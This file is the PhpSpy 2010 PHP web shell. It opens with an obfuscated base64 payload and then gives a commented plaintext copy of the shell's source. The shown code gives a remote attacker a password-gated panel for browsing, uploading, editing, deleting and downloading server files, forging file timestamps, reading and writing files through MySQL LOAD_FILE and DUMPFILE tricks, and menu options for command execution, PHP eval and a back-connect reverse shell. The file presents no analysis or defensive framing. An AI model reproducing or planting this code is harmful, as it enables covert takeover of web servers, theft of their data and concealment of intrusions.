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')));

?>

/*
error_reporting(7);
@set_magic_quotes_runtime(0);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
define('IS_COM', class_exists('COM') ? 1 : 0 );
define('IS_GPC', get_magic_quotes_gpc());
$dis_func = get_cfg_var('disable_functions');
define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
@set_time_limit(0);

foreach(array('_GET','_POST') as $_request) {
	foreach($$_request as $_key => $_value) {
		if ($_key{0} != '_') {
			if (IS_GPC) {
				$_value = s_array($_value);
			}
			$$_key = $_value;
		}
	}
}

//......................
!$writabledb && $writabledb = 'php,cgi,pl,asp,inc,js,html,htm,jsp';

$charsetdb = array('','armscii8','ascii','big5','binary','cp1250','cp1251','cp1256','cp1257','cp850','cp852','cp866','cp932','dec8','eucjpms','euckr','gb2312','gbk','geostd8','greek','hebrew','hp8','keybcs2','koi8r','koi8u','latin1','latin2','latin5','latin7','macce','macroman','sjis','swe7','tis620','ucs2','ujis','utf8');
if ($charset == 'utf8') {
	header("content-Type: text/html; charset=utf-8");
} elseif ($charset == 'big5') {
	header("content-Type: text/html; charset=big5");
} elseif ($charset == 'gbk') {
	header("content-Type: text/html; charset=gbk");
} elseif ($charset == 'latin1') {
	header("content-Type: text/html; charset=iso-8859-2");
} elseif ($charset == 'euckr') {
	header("content-Type: text/html; charset=euc-kr");
} elseif ($charset == 'eucjpms') {
	header("content-Type: text/html; charset=euc-jp");
}

$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$timestamp = time();

/*===================== ........ =====================*/
if ($action == "logout") {
	scookie('loginpass', '', -86400 * 365);
	p('<meta http-equiv="refresh" content="1;URL='.$self.'">');
	p('<a style="font:12px Verdana" href="'.$self.'">Success</a>');
	exit;
}
if($admin['check']) {
	if ($doing == 'login') {
		if ($admin['pass'] == md5($password)) {
			scookie('loginpass', md5($password));
			p('<meta http-equiv="refresh" content="1;URL='.$self.'">');
			p('<a style="font:12px Verdana" href="'.$self.'">Success</a>');
			exit;
		}
	}
	if ($_COOKIE['loginpass']) {
		if ($_COOKIE['loginpass'] != $admin['pass']) {
			loginpage();
		}
	} else {
		loginpage();
	}
}
/*===================== ........ =====================*/

$errmsg = '';

// ....PHPINFO
if ($action == 'phpinfo') {
	if (IS_PHPINFO) {
		phpinfo();
		exit;
	} else {
		$errmsg = 'phpinfo() function has non-permissible';
	}
}

// ........
if ($doing == 'downfile' && $thefile) {
	if (!@file_exists($thefile)) {
		$errmsg = 'The file you want Downloadable was nonexistent';
	} else {
		$fileinfo = pathinfo($thefile);
		header('Content-type: application/x-'.$fileinfo['extension']);
		header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
		header('Content-Length: '.filesize($thefile));
		@readfile($thefile);
		exit;
	}
}

// ..................
if ($doing == 'backupmysql' && !$saveasfile) {
	if (!$table) {
		$errmsg ='Please choose the table';
	} else {
		mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		$filename = basename($dbname.'.sql');
		header('Content-type: application/unknown');
		header('Content-Disposition: attachment; filename='.$filename);
		foreach($table as $k => $v) {
			if ($v) {
				sqldumptable($v);
			}
		}
		mysql_close();
		exit;
	}
}

// ....MYSQL........
if($doing=='mysqldown'){
	if (!$dbname) {
		$errmsg = 'Please input dbname';
	} else {
		mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		if (!file_exists($mysqldlfile)) {
			$errmsg = 'The file you want Downloadable was nonexistent';
		} else {
			$result = q("select load_file('$mysqldlfile');");
			if(!$result){
				q("DROP TABLE IF EXISTS tmp_angel;");
				q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
				//..................,......................__angel_1111111111_eof__....................
				q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
				$result = q("select content from tmp_angel");
				q("DROP TABLE tmp_angel");
			}
			$row = @mysql_fetch_array($result);
			if (!$row) {
				$errmsg = 'Load file failed '.mysql_error();
			} else {
				$fileinfo = pathinfo($mysqldlfile);
				header('Content-type: application/x-'.$fileinfo['extension']);
				header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
				header("Accept-Length: ".strlen($row[0]));
				echo $row[0];
				exit;
			}
		}
	}
}

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk">
<title><?php echo str_replace('.','','P.h.p.S.p.y');?></title>
<style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
</style>
<script type="text/javascript">
function CheckAll(form) {
	for(var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function $(id) {
	return document.getElementById(id);
}
function goaction(act){
	$('goaction').action.value=act;
	$('goaction').submit();
}
function createdir(){
	var newdirname;
	newdirname = prompt('Please input the directory name:', '');
	if (!newdirname) return;
	$('createdir').newdirname.value=newdirname;
	$('createdir').submit();
}
function fileperm(pfile){
	var newperm;
	newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
	if (!newperm) return;
	$('fileperm').newperm.value=newperm;
	$('fileperm').pfile.value=pfile;
	$('fileperm').submit();
}
function copyfile(sname){
	var tofile;
	tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
	if (!tofile) return;
	$('copyfile').tofile.value=tofile;
	$('copyfile').sname.value=sname;
	$('copyfile').submit();
}
function rename(oldname){
	var newfilename;
	newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
	if (!newfilename) return;
	$('rename').newfilename.value=newfilename;
	$('rename').oldname.value=oldname;
	$('rename').submit();
}
function dofile(doing,thefile,m){
	if (m && !confirm(m)) {
		return;
	}
	$('filelist').doing.value=doing;
	if (thefile){
		$('filelist').thefile.value=thefile;
	}
	$('filelist').submit();
}
function createfile(nowpath){
	var filename;
	filename = prompt('Please input the file name:', '');
	if (!filename) return;
	opfile('editfile',nowpath + filename,nowpath);
}
function opfile(action,opfile,dir){
	$('fileopform').action.value=action;
	$('fileopform').opfile.value=opfile;
	$('fileopform').dir.value=dir;
	$('fileopform').submit();
}
function godir(dir,view_writable){
	if (view_writable) {
		$('godir').view_writable.value=view_writable;
	}
	$('godir').dir.value=dir;
	$('godir').submit();
}
function getsize(getdir,dir){
	$('getsize').getdir.value=getdir;
	$('getsize').dir.value=dir;
	$('getsize').submit();
}
function editrecord(action, base64, tablename){
	if (action == 'del') {		
		if (!confirm('Is or isn\'t deletion record?')) return;
	}
	$('recordlist').doing.value=action;
	$('recordlist').base64.value=base64;
	$('recordlist').tablename.value=tablename;
	$('recordlist').submit();
}
function moddbname(dbname) {
	if(!dbname) return;
	$('setdbname').dbname.value=dbname;
	$('setdbname').submit();
}
function settable(tablename,doing,page) {
	if(!tablename) return;
	if (doing) {
		$('settable').doing.value=doing;
	}
	if (page) {
		$('settable').page.value=page;
	}
	$('settable').tablename.value=tablename;
	$('settable').submit();
}
function mssqlinfo(dbname) {
	if(!dbname) return;
	$('mssqlinfo').dbname.value=dbname;
	$('mssqlinfo').submit();
}
</script>
</head>
<body style="margin:0;table-layout:fixed; word-break:break-all">
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head">
		<td><span style="float:right;"><a href="http://www.4ngel.net" target="_blank"><?php echo str_replace('.','','P.h.p.S.p.y');?> 2010 Build 20110128</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>
	</tr>
	<tr class="alt1">
		<td><span style="float:right;">Safe Mode:<?php echo getcfg('safe_mode');?></span>
			<a href="javascript:goaction('logout');">Logout</a> | 
			<a href="javascript:goaction('file');">File Manager</a> | 
			<a href="javascript:goaction('mysqladmin');">MYSQL Manager</a> | 
			<a href="javascript:goaction('mssqladmin');">MSSQL Manager</a> | 
			<a href="javascript:goaction('sqlfile');">MySQL Upload &amp; Download</a> | 
			<a href="javascript:goaction('shell');">Execute Command</a> | 
			<a href="javascript:goaction('phpenv');">PHP Variable</a> | 
			<a href="javascript:goaction('eval');">Eval PHP Code</a>
			<?php if (!IS_WIN) {?> | <a href="javascript:goaction('backconnect');">Back Connect</a><?php }?>
		</td>
	</tr>
</table>
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<?php

formhead(array('name'=>'goaction'));
makehide('action');
formfoot();

$errmsg && m($errmsg);

// ............
if (!$dir) {
	$dir = $_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.';
}

$nowpath = getPath(SA_ROOT, $dir);
if (substr($dir, -1) != '/') {
	$dir = $dir.'/';
}
$uedir = ue($dir);

if (!$action || $action == 'file') {

	// ............
	$dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';

	// ........
	if ($doing == 'deldir' && $thefile) {
		if (!file_exists($thefile)) {
			m($thefile.' directory does not exist');
		} else {
			m('Directory delete '.(deltree($thefile) ? basename($thefile).' success' : 'failed'));
		}
	}

	// ........
	elseif ($newdirname) {
		$mkdirs = $nowpath.$newdirname;
		if (file_exists($mkdirs)) {
			m('Directory has already existed');
		} else {
			m('Directory created '.(@mkdir($mkdirs,0777) ? 'success' : 'failed'));
			@chmod($mkdirs,0777);
		}
	}

	// ........
	elseif ($doupfile) {
		m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));
	}

	// ........
	elseif ($editfilename && $filecontent) {
		$fp = @fopen($editfilename,'w');
		m('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));
		@fclose($fp);
	}

	// ............
	elseif ($pfile && $newperm) {
		if (!file_exists($pfile)) {
			m('The original file does not exist');
		} else {
			$newperm = base_convert($newperm,8,10);
			m('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : 'failed'));
		}
	}

	// ....
	elseif ($oldname && $newfilename) {
		$nname = $nowpath.$newfilename;
		if (file_exists($nname) || !file_exists($oldname)) {
			m($nname.' has already existed or original file does not exist');
		} else {
			m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : 'failed'));
		}
	}

	// ........
	elseif ($sname && $tofile) {
		if (file_exists($tofile) || !file_exists($sname)) {
			m('The goal file has already existed or original file does not exist');
		} else {
			m(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($tofile).' success' : 'failed'));
		}
	}

	// ........
	elseif ($curfile && $tarfile) {
		if (!@file_exists($curfile) || !@file_exists($tarfile)) {
			m('The goal file has already existed or original file does not exist');
		} else {
			$time = @filemtime($tarfile);
			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
		}
	}

	// ..........
	elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
		if (!@file_exists($curfile)) {
			m(basename($curfile).' does not exist');
		} else {
			$time = strtotime("$year-$month-$day $hour:$minute:$second");
			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
		}
	}

	// ........
	elseif($doing == 'downrar') {
		if($dl) {
			$recurse = 1;
			if($exclude != '') {
				$exclude = explode(';', $exclude);
			}
			$dls = array();
			foreach($dl as $val) {
				$is_dir = @is_dir($val);
				if($recurse == 1) {
					if($is_dir)	$val .= '/*.*';
				} else {
					if($is_dir) continue;
				}
				$dls[] = substr($val, strlen($nowpath), strlen($val));
			}
			if($savefile) {
				$zipfile = new zip_file($zip_file);
				$zipfile->set_options(
					array(
						'basedir' => $nowpath,
						'inmemory' => 0,
						'overwrite' => 1,
						'level' => 1,
						'recurse' => $recurse
					));
				$zipfile->add_files($dls);
				if(strstr($zip_file, $nowpath)) {
					$exclude[] = substr($zip_file, strlen($nowpath), strlen($zip_file));
				}
				if(count($exclude) > 0) {
					$zipfile->exclude_files($exclude);
				}

				$zipfile->create_archive();

				if (count($test->errors) > 0)
					print_r($test->errors);
				else
					m($zip_file.' => Done!');
			} else {
				$zipfile = new zip_file("./".str_replace('.', '_', $_SERVER['HTTP_HOST']).".zip");
				$zipfile->set_options(
					array(
						'basedir' => $nowpath,
						'inmemory' => 1,
						'overwrite' => 1,
						'level' => 1,
						'recurse' => $recurse
					));
				$zipfile->add_files($dls);
				if(count($exclude) > 0) {
					$zipfile->exclude_files($exclude);
				}
				$zipfile->create_archive();
				$zipfile->download_file();
				exit;
			}
		} else {
			m('Please select file(s)');
		}
	}

	// ............
	elseif($doing == 'delfiles') {
		if ($dl) {
			$dfiles='';
			$succ = $fail = 0;
			foreach ($dl as $filepath) {
				if (@unlink($filepath)) {
					$succ++;
				} else {
					$fail++;
				}
			}
			m('Deleted file have finished,choose '.count($dl).' success '.$succ.' fail '.$fail);
		} else {
			m('Please select file(s)');
		}
	}

	//........
	formhead(array('name'=>'createdir'));
	makehide('newdirname');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'fileperm'));
	makehide('newperm');
	makehide('pfile');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'copyfile'));
	makehide('sname');
	makehide('tofile');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'rename'));
	makehide('oldname');
	makehide('newfilename');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'fileopform', 'target'=>'_blank'));
	makehide('action');
	makehide('opfile');
	makehide('dir');
	formfoot();
	formhead(array('name'=>'getsize'));
	makehide('getdir');
	makehide('dir');
	formfoot();

	$free = @disk_free_space($nowpath);
	!$free && $free = 0;
	$all = @disk_total_space($nowpath);
	!$all && $all = 0;
	$used = $all-$free;
	$used_percent = @round(100/($all/$free),2);
	p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.$used_percent.'%)</h2>');

?>
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
  <form action="" method="post" id="godir" name="godir">
  <tr>
    <td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>
	<td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:99%;margin:0 8px;"></td>
    <td nowrap><input class="bt" value="GO" type="submit"></td>
  </tr>
  </form>
</table>
  <?php
	$findstr = $_POST['findstr'];
	$re = $_POST['re'];
	tbhead();
	p('<tr class="alt1"><td colspan="7" style="padding:5px;line-height:20px;">');
	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data"><div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="'.$dir.'" type="hidden" /><input name="dir" value="'.$dir.'" type="hidden" /></div></form>');
	p('<a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');">WebRoot</a>');
	p(' | <a href="javascript:godir(\'.\');">ScriptPath</a>');
	p(' | <a href="javascript:godir(\''.$nowpath.'\');">View All</a>');
	p(' | View Writable ( <a href="javascript:godir(\''.$nowpath.'\',\'dir\');">Directory</a>');
	p(' | <a href="javascript:godir(\''.$nowpath.'\',\'file\');">File</a> )');
	p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\''.$nowpath.'\');">Create File</a>');
	if (IS_WIN && IS_COM) {
		$obj = new COM('scripting.filesystemobject');
		if ($obj && is_object($obj) && $obj->Drives) {
			$DriveTypeDB = array(0 => 'Unknow',1 => 'Removable',2 => 'Fixed',3 => 'Network',4 => 'CDRom',5 => 'RAM Disk');
			foreach($obj->Drives as $drive) {
				if ($drive->Path) {
					p(' | <a href="javascript:godir(\''.$drive->Path.'/\');">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
				}
			}
		}
	}

	p('<br /><form action="'.$self.'" method="POST">Find string in files(current folder): <input class="input" name="findstr" value="'.$findstr.'" type="text" /> <input class="bt" value="Find" type="submit" /> Type: <input class="input" name="writabledb" value="'.$writabledb.'" type="text" /><input name="dir" value="'.$dir.'" type="hidden" /> <input name="re" value="1" type="checkbox" '.($re ? 'checked' : '').' /> Regular expressions</form></td></tr>');

	p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');

	//......................
	$dirdata=array();
	$filedata=array();

	if ($view_writable == 'dir') {
		$dirdata = GetWDirList($nowpath);
		$filedata = array();
	} elseif ($view_writable == 'file') {
		$dirdata = array();
		$filedata = GetWFileList($nowpath);
	} elseif ($findstr) {
		$dirdata = array();
		$filedata = GetSFileList($nowpath, $findstr, $re);
	} else {
		// ........
		$dirs=@opendir($dir);
		while ($file=@readdir($dirs)) {
			$filepath=$nowpath.$file;
			if(@is_dir($filepath)){
				$dirdb['filename']=$file;
				$dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
				$dirdb['dirchmod']=getChmod($filepath);
				$dirdb['dirperm']=getPerms($filepath);
				$dirdb['fileowner']=getUser($filepath);
				$dirdb['dirlink']=$nowpath;
				$dirdb['server_link']=$filepath;
				$dirdb['client_link']=ue($filepath);
				$dirdata[]=$dirdb;
			} else {		
				$filedb['filename']=$file;
				$filedb['size']=sizecount(@filesize($filepath));
				$filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
				$filedb['filechmod']=getChmod($filepath);
				$filedb['fileperm']=getPerms($filepath);
				$filedb['fileowner']=getUser($filepath);
				$filedb['dirlink']=$nowpath;
				$filedb['server_link']=$filepath;
				$filedb['client_link']=ue($filepath);
				$filedata[]=$filedb;
			}
		}// while
		unset($dirdb);
		unset($filedb);
		@closedir($dirs);
	}
	@sort($dirdata);
	@sort($filedata);
	$dir_i = '0';

	p('<form id="filelist" name="filelist" action="'.$self.'" method="post">');
	makehide('action','file');
	makehide('thefile');
	makehide('doing');
	makehide('dir',$nowpath);

	foreach($dirdata as $key => $dirdb){
		if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
			if($getdir && $getdir == $dirdb['server_link']) {
				$attachsize = dirsize($dirdb['server_link']);
				$attachsize = is_numeric($attachsize) ? sizecount($attachsize) : 'Unknown';
			} else {
				$attachsize = '<a href="javascript:getsize(\''.$dirdb['server_link'].'\',\''.$dir.'\');">Stat</a>';
			}
			$thisbg = bg();
			p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
			p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$dirdb['server_link'].'"></td>');
			p('<td><a href="javascript:godir(\''.$dirdb['server_link'].'\');">'.$dirdb['filename'].'</a></td>');
			p('<td nowrap>'.$dirdb['mtime'].'</td>');
			p('<td nowrap>'.$attachsize.'</td>');
			p('<td nowrap>');
			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirchmod'].'</a> / ');
			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirperm'].'</a>'.$dirdb['fileowner'].'</td>');
			p('<td nowrap><a href="javascript:dofile(\'deldir\',\''.$dirdb['server_link'].'\',\'Are you sure will delete <'.$dirdb['filename'].'>? \\n\\nIf non-empty directory, will be delete all the files.\')">Del</a> | <a href="javascript:rename(\''.$dirdb['server_link'].'\');">Rename</a></td>');
			p('</tr>');
			$dir_i++;
		} else {
			if($dirdb['filename']=='..') {
				p('<tr class='.bg().'>');
				p('<td align="center">-</td><td nowrap colspan="5"><a href="javascript:godir(\''.getUpPath($nowpath).'\');">Parent Directory</a></td>');
				p('</tr>');
			}
		}
	}

	p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>');
	$file_i = '0';

	foreach($filedata as $key => $filedb){
		if($filedb['filename']!='..' && $filedb['filename']!='.') {
			$fileurl = str_replace($_SERVER["DOCUMENT_ROOT"],'',$filedb['server_link']);
			$thisbg = bg();
			p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
			p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$filedb['server_link'].'"></td>');
			p('<td><a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a></td>');
			p('<td nowrap>'.$filedb['mtime'].'</td>');
			p('<td nowrap>'.$filedb['size'].'</td>');
			p('<td nowrap>');
			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['filechmod'].'</a> / ');
			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['fileperm'].'</a>'.$filedb['fileowner'].'</td>');
			p('<td nowrap>');
			p('<a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');">Down</a> | ');
			p('<a href="javascript:copyfile(\''.$filedb['server_link'].'\');">Copy</a> | ');
			p('<a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Edit</a> | ');
			p('<a href="javascript:rename(\''.$filedb['server_link'].'\');">Rename</a> | ');
			p('<a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Time</a>');
			p('</td></tr>');
			$file_i++;
		}
	}
	p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
	p('<tr class="'.bg().'"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td colspan="4"><a href="javascript:dofile(\'delfiles\');">Delete selected</a> - <a href="javascript:dofile(\'downrar\');">Packing selected</a> - <input type="checkbox"  name="savefile" value="1" /> Save as file <input class="input" name="zip_file" value="'.SA_ROOT.$_SERVER['HTTP_HOST'].'.zip" type="text" />. Exclude type <input class="input" name="exclude" value="" type="text" title="*.jpg;*.gif;*.png;*.bmp" /></td><td align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
	p('</form></table>');
}// end dir

elseif ($action == 'sqlfile') {
	if($doing=="mysqlupload"){
		$file = $_FILES['uploadfile'];
		$filename = $file['tmp_name'];
		if (file_exists($savepath)) {
			m('The goal file has already existed');
		} else {
			if(!$filename) {
				m('Please choose a file');
			} else {
				$fp=@fopen($filename,'r');
				$contents=@fread($fp, filesize($filename));
				@fclose($fp);
				$contents = bin2hex($contents);
				if(!$upname) $upname = $file['name'];
				mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
				$result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
				m($result ? 'Upload success' : 'Upload has failed: '.mysql_error());
			}
		}
	}
?>
<script type="text/javascript">
function mysqlfile(doing){
	if(!doing) return;
	$('doing').value=doing;
	$('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
	$('mysqlfile').dbport.value=$('dbinfo').dbport.value;
	$('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
	$('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
	$('mysqlfile').dbname.value=$('dbinfo').dbname.value;
	$('mysqlfile').charset.value=$('dbinfo').charset.value;
	$('mysqlfile').submit();
}
</script>
